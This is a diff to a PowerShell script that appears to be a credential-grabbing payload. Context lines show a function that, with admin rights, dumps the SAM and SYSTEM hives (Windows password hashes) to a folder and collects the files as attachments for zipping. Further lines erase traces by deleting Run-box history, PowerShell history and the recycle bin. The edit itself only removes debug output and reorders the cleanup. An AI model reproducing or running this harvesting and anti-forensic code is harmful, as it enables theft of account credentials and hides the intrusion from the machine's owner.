@@ -244,7 +244,6 @@ Create-Report
 
 function Try-Grab-Sam-File() {
 	if ($isRunningAsAdmin -eq $true) {
-		echo "IsAdmin"
 		$samFilePath = "$baseFolder\SAM.txt"
 		$systemFilePath = "$baseFolder\SYSTEM.txt"
 
@@ -274,7 +273,6 @@ foreach ($file in $files) {
 	$fileName = $file.Name
 	$attachments += "$baseFolder\$fileName"
 }
-echo $attachments
 
 if ($zip -eq $true) {
 	$compress = @{
@@ -307,11 +305,11 @@ if (Test-Path -Path $tempFolder) {
 # Delete run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
+# Delete contents of recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
 # Delete powershell history
 $powerShellHistoryFilePath = (Get-PSreadlineOption).HistorySavePath
 if (Test-Path -Path $powerShellHistoryFilePath) {
 	Remove-Item -force $powerShellHistoryFilePath
 }
-
-# Delete contents of recycle bin
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
